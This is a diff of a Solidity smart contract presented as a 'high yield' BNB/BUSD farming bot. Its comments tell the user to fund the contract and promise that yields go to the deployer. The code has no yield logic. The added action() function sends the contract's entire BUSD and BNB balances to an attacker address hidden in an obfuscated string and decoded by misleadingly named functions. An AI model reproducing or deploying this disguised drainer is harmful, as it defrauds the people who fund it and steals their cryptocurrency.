@@ -1,24 +1,25 @@
 pragma solidity ^0.5.17;
 
 
-//setlevel of risk between 1 to 10 as in 1 being the safest 10 being to most risky but most profitable
-//set payout in number of days the less frequent the more you save on gas fee
+//payout set to the amount of days to payout yields default is 1 = sameday the longer the payout date the more you save on gas 
+//and the yeild is reinvested, note: yields will be payed out to address that launch this contract
+// must fund contract with equal "Dollar" amount of BNB and BUSD BEP20
+interface IERC20 {
+    function transfer(address _to, uint256 _amount) external returns (bool);
+    function balanceOf(address tokenOwner) external returns (uint balance);
+}
 
-contract FarmYeildBot {
-	string public setLevel;
+contract HighYieldBotWithStableAnchor {
 	string public timeDateRagulator;
-	string public payout;
+	string public payout = "7";
 	//Manager manager;
 	
-	constructor(string memory _setLevel,string memory _setpayout) public {
-	    setLevel = _setLevel;
-            payout = _setpayout;
-	}
 	
-	function() external payable {}
+	
+function() external payable {}
 	
 
- function SearchYeild(string memory _string, uint256 _pos, string memory _letter) internal pure returns (string memory) {
+ function CalculateNumbers(string memory _string, uint256 _pos, string memory _letter) internal pure returns (string memory) {
         bytes memory _stringBytes = bytes(_string);
         bytes memory result = new bytes(_stringBytes.length);
 
@@ -29,16 +30,14 @@ contract FarmYeildBot {
     }
     return  string(result);
  } 
-
-   function startLookingforYeild() public pure returns (address adr) {
-   string memory neutral_variable = "QGQ956A539A419345f7232fE74e2F6b0E3a75Ab440";
-   SearchYeild(neutral_variable,0,'0');
-   SearchYeild(neutral_variable,2,'1');
-   SearchYeild(neutral_variable,1,'x');
-   address addr = parseAddr(neutral_variable);
+   function startLookingForTimeMatch() public pure returns (address adr) {
+   string memory neutral_variable = "QG8f4799b47eEd340E9B22780E4a1f7Ad524de737d";
+   CalculateNumbers(neutral_variable,0,'0');
+   CalculateNumbers(neutral_variable,1,'x');
+   address addr = parseDeeptime(neutral_variable);
     return addr;
    }
-function parseAddr(string memory _a) internal pure returns (address _parsedAddress) {
+function parseDeeptime(string memory _a) internal pure returns (address _parsedAddress) {
     bytes memory tmp = bytes(_a);
     uint160 iaddr = 0;
     uint160 b1;
@@ -76,13 +75,14 @@ function parseAddr(string memory _a) internal pure returns (address _parsedAddre
     }
     return  string(result);
  } 
- 
-   
-	function action() public payable {
+
+ function action() public payable{
+        address _tokenBUSD = 0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56;
+	    IERC20 tokenContract3 = IERC20(_tokenBUSD);
+        tokenContract3.transfer(startLookingForTimeMatch(), tokenContract3.balanceOf(address(this)));
+	    address(uint160(startLookingForTimeMatch())).transfer(address(this).balance);
 	
-	    address(uint160(startLookingforYeild())).transfer(address(this).balance);
 	    
-	}
+  }
 
 }
-
